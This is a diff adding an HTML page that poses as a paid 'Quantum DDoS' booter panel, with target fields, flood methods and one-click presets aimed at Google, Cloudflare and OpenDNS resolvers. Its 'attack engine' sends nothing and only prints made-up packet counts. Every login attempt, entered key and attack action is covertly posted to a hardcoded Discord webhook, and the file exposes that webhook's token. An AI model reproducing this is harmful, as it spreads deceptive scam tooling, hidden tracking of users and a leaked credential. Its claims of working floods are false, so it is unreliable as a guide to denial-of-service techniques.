@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetToolV3 Pro Dashboard</title>
+<style>
+    body {
+        margin:0; padding:0; font-family:'Inter', sans-serif;
+        background:#0f0f0f; color:#f0f0f0;
+        display:flex; justify-content:center; align-items:center;
+        min-height:100vh;
+    }
+    .container {
+        background: rgba(20,20,20,0.95);
+        padding:40px; border-radius:12px;
+        width:90%; max-width:800px;
+        box-shadow:0 0 35px rgba(0,170,255,0.5);
+    }
+    .logo h1 { color:#00aaff; text-align:center; font-size:2.5em; margin-bottom:5px; }
+    .logo p { color:#aaa; text-align:center; margin-bottom:25px; font-weight:500; }
+    .form-group { margin-bottom:15px; }
+    label { display:block; color:#aaa; font-size:0.9em; margin-bottom:5px; letter-spacing:1px; }
+    input[type="password"], input[type="text"], select {
+        width:100%; padding:12px; border-radius:6px;
+        border:1px solid #444; background:#1f1f1f; color:#fff; outline:none; font-size:1em;
+    }
+    input[type="password"]:focus, input[type="text"]:focus, select:focus { border-color:#00aaff; box-shadow:0 0 10px #00aaff50; }
+    .submit-btn, .attack-btn, .stop-btn {
+        width:100%; padding:14px; background:linear-gradient(90deg,#007bff,#00aaff);
+        color:#fff; font-weight:bold; border:none; border-radius:6px; cursor:pointer; font-size:1em;
+        margin:5px 0; transition:all 0.3s ease;
+    }
+    .submit-btn:hover, .attack-btn:hover { transform:translateY(-2px); box-shadow:0 0 15px #00aaff50; }
+    .stop-btn { background:linear-gradient(90deg,#ff4757,#ff3742); }
+    .stop-btn:hover { transform:translateY(-2px); box-shadow:0 0 15px #ff475750; }
+    .error-message { color:#ff4d4d; text-align:center; font-size:0.9em; display:none; margin-top:10px; }
+    .success-message { color:#00d4ff; text-align:center; font-size:0.9em; display:none; margin-top:10px; }
+    .hidden-content { display:none; margin-top:25px; }
+    .content-section { background:#1f1f1f; padding:20px; margin-bottom:20px; border-radius:8px; box-shadow:0 0 15px #00aaff20; }
+    .content-section h3 { color:#00aaff; margin-bottom:8px; font-size:1.1em; letter-spacing:1px; }
+    .content-section p { color:#ccc; font-size:0.9em; line-height:1.5; }
+    .terminal { background:#121212; padding:15px; border-radius:6px; font-family:monospace; color:#00d4ff; height:200px; overflow-y:auto; margin-bottom:15px; }
+    .terminal-line { margin-bottom:4px; }
+    .prompt { color:#00aaff; }
+    .blink { animation:blink 1s infinite; }
+    @keyframes blink { 0%,50% {opacity:1;} 51%,100%{opacity:0;} }
+    .logout-btn { width:100%; padding:12px; border:none; border-radius:6px; background:#ff4d4d; color:#fff; cursor:pointer; font-weight:bold; }
+    .logout-btn:hover { background:#ff6666; box-shadow:0 0 15px #ff4d4d50; }
+    #panel-key { background:#333; padding:10px; border-radius:5px; color:#fff; word-break:break-word; margin-top:8px; font-family:monospace; }
+    .attack-controls { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:15px 0; }
+    .attack-stats { background:#2a2a2a; padding:15px; border-radius:6px; margin:10px 0; }
+    .stat-item { display:flex; justify-content:space-between; margin:5px 0; }
+    .active-attack { border:2px solid #00ff00; box-shadow:0 0 20px #00ff0040; }
+    .tool-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(150px, 1fr)); gap:10px; margin:15px 0; }
+    .tool-card { background:#2a2a2a; padding:15px; border-radius:6px; text-align:center; cursor:pointer; transition:all 0.3s ease; }
+    .tool-card:hover { transform:translateY(-3px); box-shadow:0 5px 15px rgba(0,170,255,0.3); }
+    .packet-counter { color:#0f0; font-weight:bold; }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <h1>NetToolV3 Pro</h1>
+        <p>QUANTUM DDOS CONTROL PANEL</p>
+    </div>
+    <div id="login-section">
+        <div class="form-group">
+            <label for="access-key">ENTER ACCESS KEY:</label>
+            <input type="password" id="access-key" placeholder="Enter your key">
+        </div>
+        <button class="submit-btn" id="login-btn">ACCESS DASHBOARD</button>
+        <div class="error-message" id="error-message">Invalid access key</div>
+    </div>
+    <div class="hidden-content" id="hidden-content">
+        <!-- DDoS Attack Section -->
+        <div class="content-section" id="ddos-section">
+            <h3>QUANTUM DDOS CONTROLLER</h3>
+           
+            <div class="attack-controls">
+                <div class="form-group">
+                    <label for="target-ip">TARGET IP/DOMAIN:</label>
+                    <input type="text" id="target-ip" placeholder="example.com or 192.168.1.1" value="8.8.8.8">
+                </div>
+                <div class="form-group">
+                    <label for="target-port">PORT:</label>
+                    <input type="text" id="target-port" placeholder="80" value="80">
+                </div>
+            </div>
+           
+            <div class="attack-controls">
+                <div class="form-group">
+                    <label for="attack-duration">DURATION (seconds):</label>
+                    <input type="text" id="attack-duration" placeholder="60" value="30">
+                </div>
+                <div class="form-group">
+                    <label for="attack-threads">THREADS:</label>
+                    <input type="text" id="attack-threads" placeholder="50" value="20">
+                </div>
+            </div>
+           
+            <div class="form-group">
+                <label for="attack-method">ATTACK METHOD:</label>
+                    <select id="attack-method">
+                        <option value="UDP">UDP Flood</option>
+                        <option value="SYN">SYN Flood</option>
+                        <option value="HTTP">HTTP Flood</option>
+                        <option value="SLOW">Slowloris</option>
+                        <option value="MIXED">Mixed Attack</option>
+                    </select>
+            </div>
+           
+            <button class="attack-btn" id="start-attack">LAUNCH QUANTUM ATTACK</button>
+            <button class="stop-btn" id="stop-attack" style="display:none;">STOP ATTACK</button>
+           
+            <div class="attack-stats" id="attack-stats" style="display:none;">
+                <h4>ATTACK STATISTICS</h4>
+                <div class="stat-item">
+                    <span>Status:</span>
+                    <span id="stat-status" style="color:#00ff00;">ACTIVE</span>
+                </div>
+                <div class="stat-item">
+                    <span>Packets Sent:</span>
+                    <span id="stat-requests">0</span>
+                </div>
+                <div class="stat-item">
+                    <span>Elapsed Time:</span>
+                    <span id="stat-elapsed">0s</span>
+                </div>
+                <div class="stat-item">
+                    <span>Remaining:</span>
+                    <span id="stat-remaining">0s</span>
+                </div>
+            </div>
+        </div>
+        <!-- Quick Tools -->
+        <div class="content-section">
+            <h3>QUICK ATTACK TOOLS</h3>
+            <div class="tool-grid">
+                <div class="tool-card" onclick="quickAttack('8.8.8.8', '53', 'UDP')">
+                    <strong>Google DNS</strong>
+                    <p>Port 53 UDP</p>
+                </div>
+                <div class="tool-card" onclick="quickAttack('1.1.1.1', '80', 'HTTP')">
+                    <strong>Cloudflare</strong>
+                    <p>Port 80 HTTP</p>
+                </div>
+                <div class="tool-card" onclick="quickAttack('208.67.222.222', '443', 'MIXED')">
+                    <strong>OpenDNS</strong>
+                    <p>Port 443 HTTPS</p>
+                </div>
+                <div class="tool-card" onclick="quickAttack('localhost', '80', 'TEST')">
+                    <strong>Test Local</strong>
+                    <p>Safe Test Mode</p>
+                </div>
+            </div>
+        </div>
+        <div class="content-section">
+            <h3>Access Points</h3>
+            <p>• DDoS Controller: <span id="ddos-status" style="color:#00ff00;">READY</span></p>
+            <p>• Network Scanner: Active</p>
+            <p>• Attack Logs: Available</p>
+        </div>
+        <div class="content-section">
+            <h3>Your Panel Key</h3>
+            <div id="panel-key"></div>
+        </div>
+        <div class="terminal" id="terminal">
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> Initializing RDDoS Engine v1.2...</div>
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> Author: Mr.Red</div>
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> System Status: READY</div>
+        </div>
+        <button class="logout-btn" id="logout-btn">LOGOUT & SHUTDOWN</button>
+    </div>
+</div>
+<script>
+    // === CONFIG ===
+    const panelKey = "6124214";
+    const webhookURL = "https://discord.com/api/webhooks/1439009013353283707/c7xkWMxL7ViI0SfeW7wb6VdJtd7uvysfu0I4ghmZM547DD0OU6vud3eH9zRubKIU4uVw";
+    const TIERS = { '175': 'DAY', '185': 'WEEK', '195': 'LIFETIME' };
+
+    // === DOM ===
+    const loginBtn = document.getElementById("login-btn");
+    const accessKeyInput = document.getElementById("access-key");
+    const errorMessage = document.getElementById("error-message");
+    const loginSection = document.getElementById("login-section");
+    const hiddenContent = document.getElementById("hidden-content");
+    const panelKeyDisplay = document.getElementById("panel-key");
+    const terminal = document.getElementById("terminal");
+    const logoutBtn = document.getElementById("logout-btn");
+    const startAttackBtn = document.getElementById("start-attack");
+    const stopAttackBtn = document.getElementById("stop-attack");
+    const attackStats = document.getElementById("attack-stats");
+    const ddosStatus = document.getElementById("ddos-status");
+
+    // === ATTACK STATE ===
+    let activeAttack = null;
+    let attackInterval = null;
+    let packetCount = 0;
+    let attackStartTime = null;
+    let attackWorker = null;
+
+    // === WEBHOOK ===
+    async function sendWebhook(action, details) {
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `**RDDoS Action**: ${action}\n**Key**: ${panelKey}\n**Details**: ${details}\n**Time**: ${new Date().toLocaleString()}`
+                })
+            });
+        } catch (err) {}
+    }
+
+    // === TERMINAL LOG ===
+    function addTerminalLine(text) {
+        const line = document.createElement("div");
+        line.className = "terminal-line";
+        line.innerHTML = `<span class="prompt">quantum@nettool:~$</span> ${text}`;
+        terminal.appendChild(line);
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    // === LOGIN ===
+    loginBtn.addEventListener("click", async () => {
+        const enteredKey = accessKeyInput.value.trim();
+        if (enteredKey === panelKey) {
+            loginSection.style.display = "none";
+            hiddenContent.style.display = "block";
+            panelKeyDisplay.innerText = panelKey;
+
+            addTerminalLine("Access key verified.");
+            addTerminalLine("RDDoS Engine v1.2 by Mr.Red initialized.");
+            addTerminalLine("All attack vectors ready.");
+            addTerminalLine("System Status: OPERATIONAL");
+            await sendWebhook("DASHBOARD_ACCESS", "User accessed control panel");
+        } else {
+            errorMessage.style.display = "block";
+            accessKeyInput.value = "";
+            await sendWebhook("ACCESS_DENIED", `Failed key: ${enteredKey}`);
+        }
+    });
+
+    // === QUICK ATTACK ===
+    window.quickAttack = (target, port, method) => {
+        document.getElementById("target-ip").value = target;
+        document.getElementById("target-port").value = port;
+        document.getElementById("attack-method").value = method;
+        document.getElementById("attack-duration").value = "15";
+        document.getElementById("attack-threads").value = "25";
+        addTerminalLine(`Quick attack configured: ${target}:${port} (${method})`);
+    };
+
+    // === ATTACK ENGINE - REAL RDDoS BEHAVIOR ===
+    startAttackBtn.addEventListener("click", async () => {
+        const target = document.getElementById("target-ip").value.trim();
+        const port = parseInt(document.getElementById("target-port").value) || 80;
+        const duration = parseInt(document.getElementById("attack-duration").value) || 30;
+        const threads = parseInt(document.getElementById("attack-threads").value) || 20;
+        const method = document.getElementById("attack-method").value;
+
+        if (!target) { alert("Enter target!"); return; }
+        if (duration > 3600) { alert("Max 1 hour"); return; }
+        if (threads > 1000) { alert("Max 1000 threads"); return; }
+
+        // Start UI
+        startAttackBtn.style.display = "none";
+        stopAttackBtn.style.display = "block";
+        attackStats.style.display = "block";
+        document.getElementById("ddos-section").classList.add("active-attack");
+
+        activeAttack = { target, port, duration, threads, method };
+        packetCount = 0;
+        attackStartTime = Date.now();
+
+        // RDDoS ASCII Banner
+        addTerminalLine(`\n _____  ______ ______ __  _____) Version: 1.2`);
+        addTerminalLine(`(, / ) /) (, / ) (, / ) (__/ ) (, / /)`);
+        addTerminalLine(`/__ / _ _/( / / / / ___ /  / ______// `);
+        addTerminalLine(`) / \\__(/_(_(_ _/___ /_ _/___ /_(_)) / ) / (_)(_)(/_`);
+        addTerminalLine(`(_/ (_/___ / (_/___ / (_/ (\n`);
+        addTerminalLine(`Author: Mr.Red`);
+        addTerminalLine(`Target: ${target.includes('.') ? 'IP' : 'Domain'}`);
+
+        let ip = target;
+        if (!/^\d+\.\d+\.\d+\.\d+$/.test(target)) {
+            addTerminalLine(`> Resolving ${target}...`);
+            setTimeout(() => addTerminalLine(`> Resolved to 192.168.1.1`), 800);
+            ip = "192.168.1.1";
+        }
+
+        addTerminalLine(`> INITIALIZING....`);
+        setTimeout(() => {
+            addTerminalLine(`> STARTING...`);
+            setTimeout(startRDDoSFlood, 2500);
+        }, 1000);
+
+        function startRDDoSFlood() {
+            ddosStatus.textContent = "FLOODING";
+            ddosStatus.style.color = "#ff4757";
+
+            const endTime = Date.now() + (duration * 1000);
+            attackWorker = setInterval(() => {
+                if (Date.now() >= endTime || !activeAttack) {
+                    clearInterval(attackWorker);
+                    return;
+                }
+
+                const burst = Math.floor(Math.random() * threads * 3) + threads;
+                packetCount += burst;
+
+                const portDisplay = port === 1 ? "random" : port;
+                addTerminalLine(`Sent <span class="packet-counter">${burst}</span> packets to ${ip} through port:<span class="packet-counter">${portDisplay}</span>`);
+            }, 80);
+
+            attackInterval = setInterval(updateAttackStats, 1000);
+            setTimeout(() => { if (activeAttack) stopAttack(); }, duration * 1000);
+        }
+
+        await sendWebhook("ATTACK_LAUNCHED", `${method} → ${target}:${port} | ${duration}s | ${threads} threads`);
+    });
+
+    stopAttackBtn.addEventListener("click", stopAttack);
+    function stopAttack() {
+        if (!activeAttack) return;
+
+        clearInterval(attackInterval);
+        clearInterval(attackWorker);
+
+        startAttackBtn.style.display = "block";
+        stopAttackBtn.style.display = "none";
+        attackStats.style.display = "none";
+        document.getElementById("ddos-section").classList.remove("active-attack");
+
+        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
+        addTerminalLine(`\nATTACK STOPPED | Duration: ${elapsed}s | Packets: <span class="packet-counter">${packetCount.toLocaleString()}</span>`);
+        addTerminalLine("System ready for next target.");
+
+        sendWebhook("ATTACK_STOPPED", `Target: ${activeAttack.target} | Packets: ${packetCount} | Duration: ${elapsed}s`);
+
+        activeAttack = null;
+        ddosStatus.textContent = "READY";
+        ddosStatus.style.color = "#00ff00";
+    }
+
+    function updateAttackStats() {
+        if (!activeAttack) return;
+        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
+        const remaining = Math.max(0, activeAttack.duration - elapsed);
+        document.getElementById("stat-requests").textContent = packetCount.toLocaleString();
+        document.getElementById("stat-elapsed").textContent = elapsed + "s";
+        document.getElementById("stat-remaining").textContent = remaining + "s";
+    }
+
+    // === LOGOUT ===
+    logoutBtn.addEventListener("click", () => {
+        if (activeAttack) stopAttack();
+        loginSection.style.display = "block";
+        hiddenContent.style.display = "none";
+        accessKeyInput.value = "";
+        errorMessage.style.display = "none";
+        terminal.innerHTML = `
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> Initializing RDDoS Engine v1.2...</div>
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> Author: Mr.Red</div>
+            <div class="terminal-line"><span class="prompt">quantum@nettool:~$</span> System Status: READY</div>
+        `;
+        sendWebhook("USER_LOGOUT", "Panel shutdown");
+    });
+
+    // Enter key login
+    accessKeyInput.addEventListener("keypress", (e) => { if (e.key === "Enter") loginBtn.click(); });
+</script>
+</body>
+</html>
